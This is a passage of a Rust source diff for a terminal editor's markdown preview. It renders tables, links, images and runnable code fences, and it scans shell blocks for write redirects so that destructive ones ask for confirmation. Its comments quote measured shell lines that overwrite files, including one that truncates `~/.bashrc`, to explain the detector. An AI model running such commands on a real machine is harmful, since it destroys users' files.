+/// `echo "hello\nworld # note" > /tmp/x` is a redirect, not a comment.
+/// `<>` counts: it opens its target for writing too.
+fn has_write_redirect(code: &str) -> bool {
+    match redirect_scan(code, true) {
+        RedirectScan::Found => true,
+        RedirectScan::Clean => false,
+        RedirectScan::Unterminated => {
+            matches!(redirect_scan(code, false), RedirectScan::Found)
+        }
+    }
+}
+
+enum RedirectScan {
+    Found,
+    Clean,
+    /// The block ended inside a quote, so nothing after the opening quote
+    /// was looked at.
+    Unterminated,
+}
+
+/// Whether `prev` ends a shell word, so a `#` immediately after it opens a
+/// comment rather than sitting mid-token.
+///
+/// Whitespace is the obvious case. The operators matter too, and getting
+/// this wrong the other way was a real over-flag: `echo a|#x > /tmp/y` was
+/// scored destructive because `|` is not whitespace, while every shell reads
+/// `#x > /tmp/y` there as a comment and writes nothing.
+///
+/// Every member was probed against `sh` with a positive control in the same
+/// run (the same line with the `#` removed, which does write):
+///
+/// | line | writes? |
+/// |---|---|
+/// | `echo a\|#x > out`, `echo a;#x > out`, `echo a &#x > out` | no |
+/// | `(#x > out)`, `echo a)#x > out` | no |
+/// | `echo a=#x > out`, `echo a-#x > out` | **yes** |
+///
+/// `=` and `-` are deliberately absent: they do not end a word, and
+/// admitting them would blank a redirect the shell really performs.
+///
+/// `<` and `>` are absent too, for a different reason. A `#` straight after
+/// a redirect operator is not a comment with clean semantics: `sh` answers
+/// `echo a >#x` and `cat <#x > out` with `Syntax error: end of file
+/// unexpected`, because the redirect is left with no target. Neither writes,
+/// but neither runs either, so there is no behaviour to match and nothing is
+/// gained by claiming one.
+///
+/// This list only ever grows on evidence, because every addition moves the
+/// matcher toward calling a destructive block calm.
+fn ends_a_word(prev: u8) -> bool {
+    prev.is_ascii_whitespace() || matches!(prev, b'|' | b';' | b'&' | b'(' | b')')
+}
+
+/// One pass of [`has_write_redirect`] over a whole block; `quotes` says
+/// whether `'` and `"` open a string or are ordinary bytes.
+fn redirect_scan(code: &str, quotes: bool) -> RedirectScan {
+    let b = code.as_bytes();
+    let mut quote: Option<u8> = None;
+    // The last byte that the shell would see BEFORE the current one, with a
+    // `\`-continuation and the newline it swallows skipped over: a
+    // continuation joins the two physical lines, so what precedes the join
+    // is what decides whether a `#` after it opens a comment. Start of input
+    // counts as whitespace, so a leading `#` is a comment.
+    //
+    // This is the whole reason the flag is not simply "a continuation just
+    // happened". `echo a\` + `#x > /tmp/y` joins to `echo a#x > …`, where the
+    // `#` is mid-word and all three of sh, bash and zsh write the file;
+    // `echo a \` + `#x > /tmp/y` joins to `echo a #x > …`, where it is a real
+    // comment and none of them write. The two differ only by that space.
+    let mut prev = b' ';
+    let mut i = 0;
+    while i < b.len() {
+        let c = b[i];
+        match quote {
+            Some(q) if c == q => quote = None,
+            Some(b'"') if c == b'\\' => i += 1,
+            Some(_) => {}
+            None => match c {
+                b'\\' => {
+                    // Skip the escaped byte, and leave `prev` alone: across a
+                    // continuation the shell sees the byte before the
+                    // backslash, not the backslash or the newline.
+                    i += 2;
+                    continue;
+                }
+                b'\'' | b'"' if quotes => quote = Some(c),
+                // A `#` starts a comment only when quotes are being
+                // honoured: the quote-blind rescan runs because a string
+                // was left open, and a `#` inside that string is text. And
+                // never immediately after a line continuation, where the
+                // joined word puts the `#` mid-token.
+                b'#' if quotes && ends_a_word(prev) => {
+                    // A comment runs to the end of its line; the block goes on.
+                    while i < b.len() && b[i] != b'\n' {
+                        i += 1;
+                    }
+                    continue;
+                }
+                b'>' => {
+                    let prev = if i > 0 { b[i - 1] } else { b' ' };
+                    if prev != b'-' && prev != b'=' {
+                        // Where the target search starts if this is a
+                        // single `>`. A dup is spelled with ONE: zsh parses
+                        // `>>&` as append-both-streams-to-file, so
+                        // `echo appended >>&2` APPENDS to a file named
+                        // `./2` (measured under `setopt NO_MULTIOS`, while
+                        // `>&2` on the same fixture left it alone). sh,
+                        // bash and dash reject the form outright, so this
+                        // is zsh-only and append rather than truncate, but
+                        // the direction is the dangerous one.
+                        let single = i + 1;
+                        let mut j = single;
+                        while j < b.len() && b[j] == b'>' {
+                            j += 1;
+                        }
+                        // A descriptor dup is `>&N` or `>&-`, and the `&`
+                        // binds TIGHTLY: it is checked before whitespace is
+                        // skipped, and only a digit or `-` may follow it.
+                        //
+                        // Exempting every `&`-prefixed target was wrong in
+                        // the direction that matters. `>&` is bash and zsh's
+                        // synonym for `&>`, so `echo '' >& ~/.bashrc`
+                        // TRUNCATES the file, and it was classified calm.
+                        // Measured: an 18-byte file went to 1 byte under
+                        // bash, while the `echo a >&2` control left its file
+                        // untouched. dash refuses it ("Bad fd number"), but
+                        // croft's terminal is the user's shell, and on the
+                        // two shells most people have it writes.
+                        // And the digits must run to a WORD BOUNDARY.
+                        // Checking only the byte after `&` left the same
+                        // defect one byte along: `echo overwritten >&2x`
+                        // writes the file `./2x` (measured: a 17-byte file
+                        // became 12 bytes reading "overwritten") while
+                        // `>&2` followed by anything non-word is a real dup.
+                        let dup = j == single && b.get(j) == Some(&b'&') && {
+                            let mut k = j + 1;
+                            if b.get(k) == Some(&b'-') {
+                                k += 1;
+                            } else {
+                                while k < b.len() && b[k].is_ascii_digit() {
+                                    k += 1;
+                                }
+                            }
+                            // At least one digit or a `-`, then nothing that
+                            // could continue the word.
+                            // `ends_a_word` rather than a second spelling
+                            // of it a few lines away. The two lists differed
+                            // by `(`, which no shell distinguishes here
+                            // (`>&2(` is a parse error everywhere), but two
+                            // spellings of one idea invite a wrong
+                            // unification later.
+                            k > j + 1 && b.get(k).is_none_or(|n| ends_a_word(*n))
+                        };
+                        while j < b.len() && b[j].is_ascii_whitespace() {
+                            j += 1;
+                        }
+                        let target = &code[j..];
+                        let dev_null = target.strip_prefix("/dev/null").is_some_and(|rest| {
+                            rest.is_empty()
+                                || rest.starts_with(|r: char| {
+                                    r.is_ascii_whitespace() || ";&|)".contains(r)
+                                })
+                        });
+                        if !(dup || dev_null) {
+                            return RedirectScan::Found;
+                        }
+                    }
+                }
+                _ => {}
+            },
+        }
+        prev = c;
+        i += 1;
+    }
+    if quote.is_some() {
+        RedirectScan::Unterminated
+    } else {
+        RedirectScan::Clean
+    }
+}
+
+/// One local image block in a rendered preview (#176).
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct MdImage {
+    /// Index of the first reserved (blank) line in the built lines.
+    pub first_line: usize,
+    /// Reserved line count, from the image's aspect at build time.
+    pub rows: u16,
+    pub path: std::path::PathBuf,
+}
+
+/// One link in a rendered preview (#931): its destination as written, and
+/// the `(built line, span index)` of every span that draws its text.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct MdLink {
+    pub dest: String,
+    pub spans: Vec<(usize, usize)>,
+}
+
+/// The preview's followable links and heading anchors (#931).
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct MdLinks {
+    pub links: Vec<MdLink>,
+    /// Each heading's GitHub-style slug and SOURCE line, so a `#slug` link
+    /// scrolls through the scroll-sync map like any source line.
+    pub headings: Vec<(String, usize)>,
+}
+
+/// GitHub's heading anchor: lowercased, spaces to hyphens, punctuation
+/// other than `-` and `_` dropped.
+fn heading_slug(text: &str) -> String {
+    let kept = |c: &char| c.is_alphanumeric() || matches!(c, ' ' | '-' | '_');
+    let slug = text.to_lowercase().chars().filter(kept).collect::<String>();
+    slug.replace(' ', "-")
+}
+
+/// The link index [`MarkdownPreview::link_cells`] painted into a cell.
+fn link_of(fg: Color) -> Option<usize> {
+    match fg {
+        Color::Rgb(r, g, b) => Some(usize::from(r) << 16 | usize::from(g) << 8 | usize::from(b)),
+        _ => None,
+    }
+}
+
+/// Convert one highlighted source line into owned spans, filling unstyled
+/// gaps with `code_fg` — the theme's code foreground, never the Base16
+/// literal, so gaps match the captured tokens around them on every theme.
+pub(crate) fn code_line_spans(line: &str, spans: &[HiSpan], code_fg: Color) -> Vec<Span<'static>> {
+    let mut out = Vec::new();
+    let mut cursor = 0usize;
+    for sp in spans {
+        let start = sp.range().start.min(line.len());
+        let end = sp.range().end.min(line.len());
+        if start > cursor {
+            out.push(Span::styled(
+                line[cursor..start].to_string(),
+                Style::default().fg(code_fg),
+            ));
+        }
+        if end > start {
+            out.push(Span::styled(line[start..end].to_string(), sp.style));
+        }
+        cursor = cursor.max(end);
+    }
+    if cursor < line.len() {
+        out.push(Span::styled(
+            line[cursor..].to_string(),
+            Style::default().fg(code_fg),
+        ));
+    }
+    out
+}
+
+/// Screen cells `text` takes in the preview, measured the way the painter
+/// advances (#404): a CJK character or an emoji is two, a combining mark
+/// none.
+fn cells(text: &str) -> usize {
+    usize::from(crate::cell_map::CellMap::new(text).width())
+}
+
+/// A GitHub alert's icon, title and colour (#1386), as GitHub labels them.
+/// The icons are codicons, one cell wide in a Nerd Font like the Problems
+/// panel's (an emoji is two and would push the title off its bar), and the
+/// colours are the dark-theme status hues `Theme::ui` adapts per theme.
+fn alert_label(kind: BlockQuoteKind) -> (char, &'static str, Color) {
+    match kind {
+        BlockQuoteKind::Note => ('\u{ea74}', "Note", Color::Rgb(0x3b, 0x9e, 0xff)),
+        BlockQuoteKind::Tip => ('\u{ea61}', "Tip", Color::Rgb(0x8c, 0xc2, 0x65)),
+        BlockQuoteKind::Important => ('\u{eb42}', "Important", Color::Rgb(0xb1, 0x80, 0xd7)),
+        BlockQuoteKind::Warning => ('\u{ea6c}', "Warning", Color::Rgb(0xcc, 0xa7, 0x00)),
+        BlockQuoteKind::Caution => ('\u{ea87}', "Caution", Color::Rgb(0xf1, 0x4c, 0x4c)),
+    }
+}
+
+struct Renderer<'r> {
+    theme: Theme,
+    registry: &'r mut LangRegistry,
+    out: Vec<Line<'static>>,
+    cur: Vec<Span<'static>>,
+    bold: u32,
+    italic: u32,
+    strike: u32,
+    link: u32,
+    heading: Option<HeadingLevel>,
+    /// Ordered-list counters (`Some(next)`) or bullets (`None`), by depth.
+    list_stack: Vec<Option<u64>>,
+    /// The open block quotes, outermost first: `Some` for a GitHub alert
+    /// (`> [!NOTE]`, #1386), whose bar takes the alert's colour.
+    quotes: Vec<Option<BlockQuoteKind>>,
+    /// Set at `Item` start, emitted before the item's first content so a
+    /// task-list marker can replace the plain bullet.
+    pending_marker: Option<String>,
+    /// Fence language + accumulated block text while inside a code block.
+    code_block: Option<(Option<LangKind>, String)>,
+    /// The open fence's info string and SOURCE line range, for the
+    /// runnable check (#353).
+    code_info: String,
+    code_lines: (usize, usize),
+    /// The source line of the open block's first code line (#619): after a
+    /// fence's opener, or the block's own first line when indented.
+    code_first: usize,
+    /// `(source line, built row)` of every code line (#619). Exact anchors
+    /// inside a block, so interpolation never runs across the captured
+    /// output rows a run adds under it.
+    code_anchors: Vec<(usize, usize)>,
+    runnables: Vec<MdRunnable>,
+    /// Captured runs to show under their fences (#354). Empty for a
+    /// document nothing has been run from, which is the common case.
+    outputs: BlockOutputs,
+    /// Rows of cell texts while inside a table (row 0 is the header).
+    table: Option<Vec<Vec<String>>>,
+    /// The open table's per-column alignment from its delimiter row
+    /// (`---:`, `:---:`), one entry per column (#861).
+    table_aligns: Vec<Alignment>,
+    /// Directory local image paths resolve against (#176); None keeps
+    /// every image a placeholder.
+    base_dir: Option<std::path::PathBuf>,
+    images: Vec<MdImage>,
+    /// Set while inside a RESERVED image's tag pair: pulldown-cmark
+    /// emits the alt content between Tag::Image and TagEnd::Image, and
+    /// letting it through painted the alt text after the reserved rows
+    /// (#196 review). Placeholder images keep their alt. Also set inside a
+    /// front matter block, whose text the preview hides (#1385).
+    suppress_inline: bool,
+    /// The links and heading anchors found so far (#931), the link whose
+    /// text is being drawn, and the open heading's text for its slug.
+    links: MdLinks,
+    open_link: Option<usize>,
+    heading_text: String,
+}
+
+impl Renderer<'_> {
+    fn inline_style(&self) -> Style {
+        let mut style = Style::default().fg(self.theme.ui(FG));
+        if let Some(level) = self.heading {
+            style = style.add_modifier(Modifier::BOLD);
+            style = match level {
+                HeadingLevel::H1 => style
+                    .fg(self.theme.accent())
+                    .add_modifier(Modifier::UNDERLINED),
+                HeadingLevel::H2 => style.fg(self.theme.accent()),
+                HeadingLevel::H3 => style.fg(self.theme.ui(FG)),
+                _ => style.fg(self.theme.ui(DIM)),
+            };
+        }
+        if self.bold > 0 {
+            style = style.add_modifier(Modifier::BOLD);
+        }
+        if self.italic > 0 {
+            style = style.add_modifier(Modifier::ITALIC);
+        }
+        if self.strike > 0 {
+            style = style.add_modifier(Modifier::CROSSED_OUT);
+        }
+        if self.link > 0 {
+            style = style
+                .fg(self.theme.accent())
+                .add_modifier(Modifier::UNDERLINED);
+        }
+        // An alert's body is ordinary text, as GitHub draws it; only a
+        // plain quote is muted.
+        if self.quotes.last().is_some_and(Option::is_none) {
+            style = style.fg(self.theme.ui(DIM)).add_modifier(Modifier::ITALIC);
+        }
+        style
+    }
+
+    /// The bars a row inside block quotes starts with, outermost first, each
+    /// in its quote's colour (an alert's own, #1386). Inline text gets them
+    /// from `begin_content`; code blocks and tables build their rows
+    /// themselves and ask here, or their rows would sit outside the callout.
+    fn quote_bars(&self) -> Vec<Span<'static>> {
+        self.quotes
+            .iter()
+            .map(|kind| {
+                let colour = kind.map_or(DIM, |k| alert_label(k).2);
+                Span::styled("\u{258e} ", Style::default().fg(self.theme.ui(colour)))
+            })
+            .collect()
+    }
+
+    /// The block prefix a fresh content line carries: quote bars, then list
+    /// indentation, then a pending item marker.
+    fn begin_content(&mut self) {
+        if !self.cur.is_empty() {
+            return;
+        }
+        let bars = self.quote_bars();
+        self.cur.extend(bars);
+        if !self.list_stack.is_empty() {
+            let depth = self.list_stack.len() - 1;
+            self.cur.push(Span::raw("  ".repeat(depth)));
+        }
+        if let Some(marker) = self.pending_marker.take() {
+            self.cur.push(Span::styled(
+                marker,
+                Style::default().fg(self.theme.accent()),
+            ));
+        } else if !self.list_stack.is_empty() {
+            // A wrapped/continued line inside an item hangs under its text.
+            self.cur.push(Span::raw("  "));
+        }
+    }
+
+    fn push_text(&mut self, text: &str, style: Style) {
+        self.push_span(Span::styled(text.to_string(), style));
+    }
+
+    /// Push an inline span, recording it on the open link (#931).
+    fn push_span(&mut self, span: Span<'static>) {
+        self.begin_content();
+        if let Some(link) = self.open_link.and_then(|i| self.links.links.get_mut(i)) {
+            link.spans.push((self.out.len(), self.cur.len()));
+        }
+        self.cur.push(span);
+    }
+
+    fn flush_line(&mut self) {
+        if self.cur.is_empty() {
+            return;
+        }
+        let spans = std::mem::take(&mut self.cur);
+        self.out.push(Line::from(spans));
+    }
+
+    fn ensure_blank(&mut self) {
+        self.flush_line();
+        if self.out.last().is_some_and(|l| !l.spans.is_empty()) {
+            self.out.push(Line::default());
+        }
+    }
+
+    fn end_code_block(&mut self) {
+        let Some((kind, text)) = self.code_block.take() else {
+            return;
+        };
+        let info = std::mem::take(&mut self.code_info);
+        let runnable = runnable_interpreter(&info)
+            .filter(|_| !has_control_chars(&text) && !text.trim().is_empty())
+            .and_then(|interpreter| {
+                let (_, attrs) = split_info(&info);
+                // A transcript runs its commands only (#1473), and they
+                // are what the destructive check reads.
+                let code = fence_code(&info, &text)?;
+                Some(MdRunnable {
+                    first_line: self.out.len(),
+                    lines: self.code_lines,
+                    destructive: attrs.contains(&"confirm") || looks_destructive(&code),
+                    code,
+                    interpreter,
+                    cwd_root: attrs.contains(&"cwd=root"),
+                    persist: attrs.contains(&"persist"),
+                    capture_timeout: attrs
+                        .iter()
+                        .find_map(|a| a.strip_prefix("timeout=").and_then(|v| v.parse().ok())),
+                    kernel_cell: None,
+                })
+            });
+        let bar = Span::styled("\u{258e} ", Style::default().fg(self.theme.accent()));
+        // The play glyph replaces the first line's bar (#353): the same
+        // width, so the block's text keeps its column.
+        let play = Span::styled(
+            RUN_GLYPH,
+            Style::default()
+                .fg(self.theme.accent())
+                .add_modifier(Modifier::BOLD),
+        );
+        let (fr, fg_, fb) = self.theme.syntax().fg;
+        let code_fg = Color::Rgb(fr, fg_, fb);
+        let highlighted = kind.map(|k| {
+            let bytes = text.as_bytes();
+            let line_starts = compute_line_starts(bytes);
+            highlight_text(self.registry, k, bytes, &line_starts)
+        });
+        let quote = self.quote_bars();
+        for (i, line) in text.lines().enumerate() {
+            let mut spans = quote.clone();
+            spans.push(bar.clone());
+            // The glyph takes the row's first cell, where a click on it is
+            // looked for, so inside a quote it stands in for the outer bar.
+            if i == 0 && runnable.is_some() {
+                spans[0] = play.clone();
+            }
+            match highlighted.as_ref().and_then(|h| h.get(i)) {
+                Some(hi) if !hi.is_empty() => spans.extend(code_line_spans(line, hi, code_fg)),
+                _ => spans.push(Span::styled(line.to_string(), Style::default().fg(code_fg))),
+            }
+            self.code_anchors
+                .push((self.code_first + i, self.out.len()));
+            self.out.push(Line::from(spans));
+        }
+        if let Some(r) = runnable {
+            self.push_output_box(&bar, &r);
+            self.runnables.push(r);
+        }
+        self.out.push(Line::default());
+    }
+
+    /// The captured output of `r`'s last run, under its fence (#354).
+    ///
+    /// Nothing is emitted when the block has not been run this session,
+    /// which is why a document that has never been run renders exactly as
+    /// it did before this existed. The rows carry the same bar glyph as the
+    /// code above them, so the box reads as belonging to the block rather
+    /// than as prose that happens to follow it.
+    fn push_output_box(&mut self, bar: &Span<'static>, r: &MdRunnable) {
+        let Some(out) = self.outputs.get(&r.lines.0) else {
+            return;
+        };
+        // Inside a quote the box keeps the quote's bars too, like its code.
+        let mut lead = self.quote_bars();
+        lead.push(bar.clone());
+        let row = |rest: Vec<Span<'static>>| Line::from([lead.clone(), rest].concat());
+        let dim = Style::default().fg(self.theme.ui(Color::Rgb(0x9a, 0x9a, 0x9a)));
+        // The status says which of the three things happened, because they
+        // are genuinely different: it finished well, it finished badly, or
+        // croft stopped waiting while it kept running.
+        let status = if out.timed_out {
+            Span::styled(
+                " still running".to_string(),
+                Style::default().fg(self.theme.ui(Color::Rgb(0xff, 0xd7, 0x4a))),
+            )
+        } else {
+            match out.exit {
+                Some(0) | None => Span::styled(" ok".to_string(), dim),
+                Some(code) => Span::styled(
+                    format!(" exit {code}"),
+                    Style::default()
+                        .fg(self.theme.ui(Color::Rgb(0xff, 0x5f, 0x5f)))
+                        .add_modifier(Modifier::BOLD),
+                ),
+            }
+        };
+        self.out.push(row(vec![
+            Span::styled("Output".to_string(), dim.add_modifier(Modifier::BOLD)),
+            status,
+        ]));
+
+        let lines: Vec<&str> = out.text.lines().collect();
+        // The LAST rows, not the first: a build's interesting part is its
+        // end, and the pane still holds the whole thing.
+        let skipped = lines.len().saturating_sub(OUTPUT_ROWS);
+        if skipped > 0 {
+            self.out.push(row(vec![Span::styled(
+                format!("… {skipped} earlier line(s)"),
+                dim,
+            )]));
+        }
+        let mut style = crate::ansi_text::AnsiStyle::default();
+        for line in &lines[skipped..] {
+            self.out
+                .push(row(output_spans(line, &mut style, self.theme)));
+        }
+        if out.timed_out {
+            self.out.push(row(vec![Span::styled(
+                "croft stopped waiting; the block is still running in its pane".to_string(),
+                dim,
+            )]));
+        }
+    }
+
+    fn end_table(&mut self) {
+        let Some(rows) = self.table.take() else {
+            return;
+        };
+        let aligns = std::mem::take(&mut self.table_aligns);
+        if rows.is_empty() {
+            return;
+        }
+        let cols = rows.iter().map(Vec::len).max().unwrap_or(0);
+        // Widths in screen cells, not characters (#861): the preview paints
+        // `食費` across four cells, and padding it as two pushed that row's
+        // `│` two columns right of every other row's. Each cell is measured
+        // once, for both its column's width and its own padding.
+        let cell_widths: Vec<Vec<usize>> = rows
+            .iter()
+            .map(|row| row.iter().map(|cell| cells(cell)).collect())
+            .collect();
+        let mut widths = vec![0usize; cols];
+        for row in &cell_widths {
+            for (i, w) in row.iter().enumerate() {
+                widths[i] = widths[i].max(*w);
+            }
+        }
+        let quote = self.quote_bars();
+        for (r, row) in rows.iter().enumerate() {
+            let mut spans: Vec<Span<'static>> = quote.clone();
+            let style = if r == 0 {
+                Style::default()
+                    .fg(self.theme.ui(FG))
+                    .add_modifier(Modifier::BOLD)
+            } else {
+                Style::default().fg(self.theme.ui(FG))
+            };
+            for (i, width) in widths.iter().enumerate() {
+                if i > 0 {
+                    spans.push(Span::styled(
+                        " \u{2502} ",
+                        Style::default().fg(self.theme.ui(DIM)),
+                    ));
+                }
+                let cell = row.get(i).map(String::as_str).unwrap_or("");
+                let used = cell_widths[r].get(i).copied().unwrap_or(0);
+                let pad = width.saturating_sub(used);
+                // The delimiter row's colons place the text in its column;
+                // a centred cell's odd cell of slack goes on the right.
+                let (left, right) = match aligns.get(i) {
+                    Some(Alignment::Right) => (pad, 0),
+                    Some(Alignment::Center) => (pad / 2, pad - pad / 2),
+                    Some(Alignment::Left | Alignment::None) | None => (0, pad),
+                };
+                spans.push(Span::styled(
+                    format!("{}{cell}{}", " ".repeat(left), " ".repeat(right)),
+                    style,
+                ));
+            }
+            self.out.push(Line::from(spans));
+            if r == 0 {
+                // Header separator: ─ runs joined by ┼ at each column seam.
+                let mut sep: Vec<Span<'static>> = quote.clone();
+                for (i, width) in widths.iter().enumerate() {
+                    if i > 0 {
+                        sep.push(Span::styled(
+                            "\u{2500}\u{253c}\u{2500}",
+                            Style::default().fg(self.theme.ui(DIM)),
+                        ));
+                    }
+                    sep.push(Span::styled(
+                        "\u{2500}".repeat(*width),
+                        Style::default().fg(self.theme.ui(DIM)),
+                    ));
+                }
+                self.out.push(Line::from(sep));
+            }
+        }
+        self.out.push(Line::default());
+    }
+}
+
+/// Render markdown `text` into styled preview lines.
+/// Image-less build: used by tests and any caller with no source
+/// directory to resolve pictures against.
+#[cfg_attr(not(test), allow(dead_code))]
+pub fn render_markdown(
+    text: &str,
+    theme: Theme,
+    registry: &mut LangRegistry,
+) -> Vec<Line<'static>> {
+    render_markdown_with_images(text, theme, registry, None).0
+}
+
+/// Like [`render_markdown`], resolving local images against `base_dir`
+/// into reserved blocks (#176).
+pub fn render_markdown_with_images(
+    text: &str,
+    theme: Theme,
+    registry: &mut LangRegistry,
+    base_dir: Option<&std::path::Path>,
+) -> (Vec<Line<'static>>, Vec<MdImage>) {
+    let (lines, images, _) =
+        render_markdown_full(text, theme, registry, base_dir, BlockOutputs::new());
+    (lines, images)
+}
+
+/// [`render_markdown_with_images`] plus the runnable fences (#353).
+pub fn render_markdown_full(
+    text: &str,
+    theme: Theme,
+    registry: &mut LangRegistry,
+    base_dir: Option<&std::path::Path>,
+    outputs: BlockOutputs,
+) -> (Vec<Line<'static>>, Vec<MdImage>, Vec<MdRunnable>) {
+    let (lines, images, runnables, _, _) =
+        render_markdown_mapped(text, theme, registry, base_dir, outputs);
+    (lines, images, runnables)
+}
+
+/// [`render_markdown_full`] plus the source map scroll sync reads (#619)
+/// and the links a click follows (#931).
+pub fn render_markdown_mapped(
+    text: &str,
+    theme: Theme,
+    registry: &mut LangRegistry,
+    base_dir: Option<&std::path::Path>,
+    outputs: BlockOutputs,
+) -> (
+    Vec<Line<'static>>,
+    Vec<MdImage>,
+    Vec<MdRunnable>,
+    SourceMap,
+    MdLinks,
+) {
+    let mut source_map: Vec<(usize, usize)> = Vec::new();
+    // `$…$` and `$$…$$` math (#1564), as VS Code's preview and GitHub read
+    // it; without the option a display block ran into one paragraph line.
+    // Front matter (#1385), YAML between `---` lines or TOML between `+++`
+    // lines at the very top, is a block of its own rather than a rule, a
+    // paragraph and a setext heading. GFM (#1386) only adds GitHub's alert
+    // quotes (`> [!NOTE]`), reported as the quote's kind with the marker
+    // stripped.
+    let options = Options::ENABLE_TABLES
+        | Options::ENABLE_STRIKETHROUGH
+        | Options::ENABLE_TASKLISTS
+        | Options::ENABLE_MATH
+        | Options::ENABLE_YAML_STYLE_METADATA_BLOCKS
+        | Options::ENABLE_PLUSES_DELIMITED_METADATA_BLOCKS
+        | Options::ENABLE_GFM;
+    let mut r = Renderer {
+        theme,
+        registry,
+        out: Vec::new(),
+        cur: Vec::new(),
+        bold: 0,
+        italic: 0,
+        strike: 0,
+        link: 0,
+        heading: None,
+        list_stack: Vec::new(),
+        quotes: Vec::new(),
+        pending_marker: None,
+        code_block: None,
+        code_info: String::new(),
+        code_lines: (0, 0),
+        code_first: 0,
+        code_anchors: Vec::new(),
+        runnables: Vec::new(),
+        outputs,
+        table: None,
+        table_aligns: Vec::new(),
+        base_dir: base_dir.map(|p| p.to_path_buf()),
+        images: Vec::new(),
+        suppress_inline: false,
+        links: MdLinks::default(),
+        open_link: None,
+        heading_text: String::new(),
+    };
+    // Byte offset -> line, for the runnable fences' source ranges (#353).
+    let line_starts: Vec<usize> = std::iter::once(0)
+        .chain(text.match_indices('\n').map(|(i, _)| i + 1))
+        .collect();
+    let line_of = |offset: usize| {
+        line_starts
+            .partition_point(|&s| s <= offset)
+            .saturating_sub(1)
+    };
+    for (event, range) in Parser::new_ext(text, options).into_offset_iter() {
+        // A block's start is an anchor: its source line, and the built line
+        // its first output lands on once the arm below has pushed any blank
+        // separator.
+        let block_start = matches!(
+            event,
+            Event::Start(
+                Tag::Heading { .. }
+                    | Tag::Paragraph
+                    | Tag::CodeBlock(_)
+                    | Tag::Item
+                    | Tag::BlockQuote(_)
+                    | Tag::Table(_)
+                    | Tag::HtmlBlock
+            ) | Event::Rule
+        );
+        let block_line = line_of(range.start);
+        match event {
+            Event::Start(tag) => match tag {
+                Tag::Heading { level, .. } => {
+                    r.ensure_blank();
+                    r.heading = Some(level);
+                }
+                Tag::Paragraph if r.list_stack.is_empty() && r.quotes.is_empty() => {
+                    r.ensure_blank();
+                }
+                Tag::CodeBlock(kind) => {
+                    r.ensure_blank();
+                    let lang = match &kind {
+                        CodeBlockKind::Fenced(info) => lang_for_fence(info),
+                        CodeBlockKind::Indented => None,
+                    };
+                    r.code_info = match &kind {
+                        CodeBlockKind::Fenced(info) => info.to_string(),
+                        CodeBlockKind::Indented => String::new(),
+                    };
+                    // The Start event's range spans the whole block, closer
+                    // included.
+                    r.code_lines = (
+                        line_of(range.start),
+                        line_of(range.end.saturating_sub(1)) + 1,
+                    );
+                    r.code_first =
+                        r.code_lines.0 + usize::from(matches!(kind, CodeBlockKind::Fenced(_)));
+                    r.code_block = Some((lang, String::new()));
+                }
+                Tag::List(start) => {
+                    if r.list_stack.is_empty() {
+                        r.ensure_blank();
+                    } else {
+                        r.flush_line();
+                    }
+                    r.list_stack.push(start);
+                }
+                Tag::Item => {
+                    r.flush_line();
+                    let marker = match r.list_stack.last_mut() {
+                        Some(Some(n)) => {
+                            let m = format!("{n}. ");
+                            *n += 1;
+                            m
+                        }
+                        _ => "\u{2022} ".to_string(),
+                    };
+                    r.pending_marker = Some(marker);
+                }
+                Tag::BlockQuote(kind) => {
+                    r.ensure_blank();
+                    r.quotes.push(kind);
+                    // A GitHub alert (#1386) opens with a title row in its
+                    // colour where the source has the `[!KIND]` marker the
+                    // parser strips. That row anchors the marker's line; the
+                    // generic anchor below lands a row later on the same
+                    // line, so the final dedup drops it. A list item opening
+                    // on that line anchored it already, at the blank row the
+                    // quote just put above its title, so that one goes.
+                    if let Some(kind) = kind {
+                        source_map.retain(|&(line, _)| line != block_line);
+                        source_map.push((block_line, r.out.len()));
+                        let (icon, title, colour) = alert_label(kind);
+                        r.begin_content();
+                        r.cur.push(Span::styled(
+                            format!("{icon} {title}"),
+                            Style::default()
+                                .fg(theme.ui(colour))
+                                .add_modifier(Modifier::BOLD),
+                        ));
+                        r.flush_line();
+                    }
+                }
+                Tag::Emphasis => r.italic += 1,
+                Tag::Strong => r.bold += 1,
+                Tag::Strikethrough => r.strike += 1,
+                Tag::Link { dest_url, .. } => {
+                    r.link += 1;
+                    r.open_link = Some(r.links.links.len());
+                    r.links.links.push(MdLink {
+                        dest: dest_url.to_string(),
+                        spans: Vec::new(),
+                    });
+                }
+                Tag::Image { dest_url, .. } => {
+                    // Local, existing, decodable images reserve blank
+                    // lines the app's inline-image overlay paints into
+                    // (#176). Remote URLs and misses keep the labelled
+                    // placeholder - the preview never fetches.
+                    let local = (!dest_url.contains("://"))
+                        .then(|| {
+                            r.base_dir
+                                .as_ref()
+                                .map(|d| local_image_path(d, dest_url.as_ref()))
+                        })
+                        .flatten()
+                        .flatten();
+                    // Capped like the editor's image tab and the notebook
+                    // viewer: the preview reads and decodes the whole file
+                    // on the render thread, and any README could name a
+                    // huge one.
+                    let dims = local
+                        .as_ref()
+                        .filter(|p| std::fs::metadata(p).is_ok_and(|m| m.len() <= 25 * 1024 * 1024))
+                        .and_then(|p| image::image_dimensions(p).ok())
+                        .filter(|&(w, h)| u64::from(w) * u64::from(h) <= 64_000_000);
+                    if let (Some(path), Some((px_w, px_h))) = (local, dims) {
+                        r.ensure_blank();
+                        // Cells are roughly twice as tall as wide; the
+                        // preview column is ~72 cells. Clamped so a tall
+                        // banner cannot swallow the viewport.
+                        let rows = ((px_h as f32 / px_w.max(1) as f32) * 72.0 / 2.0)
+                            .round()
+                            .clamp(3.0, 18.0) as u16;
+                        let first_line = r.out.len();
+                        for _ in 0..rows {
+                            r.out.push(Line::default());
+                        }
+                        r.images.push(MdImage {
+                            first_line,
+                            rows,
+                            path,
+                        });
+                        r.suppress_inline = true;
+                    } else {
+                        // Through `push_span`, so a badge inside a link
+                        // follows it.
+                        let style = Style::default()
+                            .fg(theme.ui(DIM))
+                            .add_modifier(Modifier::ITALIC);
+                        r.push_span(Span::styled("\u{f03e} ", style));
+                        r.push_span(Span::styled(format!("({dest_url}) "), style));
+                    }
+                }
+                Tag::Table(aligns) => {
+                    r.ensure_blank();
+                    r.table = Some(Vec::new());
+                    r.table_aligns = aligns;
+                }
+                // Metadata for the site generator, not the page: hidden, as
+                // VS Code's preview hides it.
+                Tag::MetadataBlock(_) => r.suppress_inline = true,
+                Tag::TableHead => {
+                    if let Some(rows) = r.table.as_mut() {
+                        rows.push(Vec::new());
+                    }
+                }
+                Tag::TableRow => {
